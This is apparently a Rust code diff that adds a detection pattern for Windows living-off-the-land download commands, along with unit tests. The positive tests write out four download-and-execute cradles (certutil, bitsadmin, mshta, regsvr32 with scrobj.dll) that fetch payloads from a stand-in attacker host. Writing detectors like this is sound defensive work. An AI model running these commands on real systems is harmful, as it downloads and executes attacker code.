@@ -29,6 +29,15 @@ pub(crate) static REMOTE_BINARY_PATTERNS: LazyLock<Vec<(&'static str, CompiledPa
                 // cmdlet token and evaded the alias-only list.
                 r"(?i)\b(invoke-webrequest|invoke-restmethod|iwr|irm|downloadstring|downloadfile|downloaddata|start-bitstransfer)\b[\s(]+.*(\.ps1|\.exe|\.zip|\.sh|\.py|\.js|\.bat|\.cmd|\.msi|\.pkg|\.dmg|\.deb|\.rpm)",
             ),
+            (
+                "SCRIPT_LOLBIN_REMOTE_DOWNLOAD",
+                // Windows living-off-the-land download/remote-exec cradles,
+                // each anchored on its distinctive argument so a benign use of
+                // the same binary (`certutil -hashfile`, `regsvr32 lib.dll`)
+                // does not match: certutil -urlcache, bitsadmin /transfer,
+                // mshta <url>, regsvr32 /i:<url> or scrobj.dll scriptlet.
+                r"(?i)(\bcertutil\b.*-urlcache|\bbitsadmin\b.*/transfer|\bmshta\b.*https?://|\bregsvr32\b.*(/i:https?://|scrobj\.dll))",
+            ),
         ])
     });
 
@@ -213,6 +222,48 @@ mod tests {
                     input,
                 ),
                 "lookalike PowerShell command must not match {input:?}",
+            );
+        }
+    }
+
+    /// Contract: Windows LOLBin download/remote-exec cradles match, anchored
+    /// on their distinctive argument so benign uses of the same binary do not.
+    #[test]
+    fn lolbin_remote_download_matches_cradles() {
+        for input in [
+            "certutil -urlcache -f http://attacker.example/p.exe p.exe",
+            "bitsadmin /transfer job http://attacker.example/p.exe c:\\p.exe",
+            "mshta https://attacker.example/x.hta",
+            "regsvr32 /s /n /u /i:http://attacker.example/x.sct scrobj.dll",
+        ] {
+            assert!(
+                matches(
+                    &REMOTE_BINARY_PATTERNS,
+                    "SCRIPT_LOLBIN_REMOTE_DOWNLOAD",
+                    input
+                ),
+                "expected LOLBin cradle to match {input:?}",
+            );
+        }
+    }
+
+    /// Contract (negative): benign uses of the same LOLBins (no download
+    /// argument) and substring lookalikes must NOT match.
+    #[test]
+    fn lolbin_remote_download_rejects_benign_uses() {
+        for input in [
+            "certutil -hashfile payload.exe SHA256",
+            "regsvr32 /s mylibrary.dll",
+            "mycertutil -urlcache -f http://x/y z",
+            "echo bitsadmin transfer is a windows tool",
+        ] {
+            assert!(
+                !matches(
+                    &REMOTE_BINARY_PATTERNS,
+                    "SCRIPT_LOLBIN_REMOTE_DOWNLOAD",
+                    input
+                ),
+                "benign LOLBin use must not match {input:?}",
             );
         }
     }
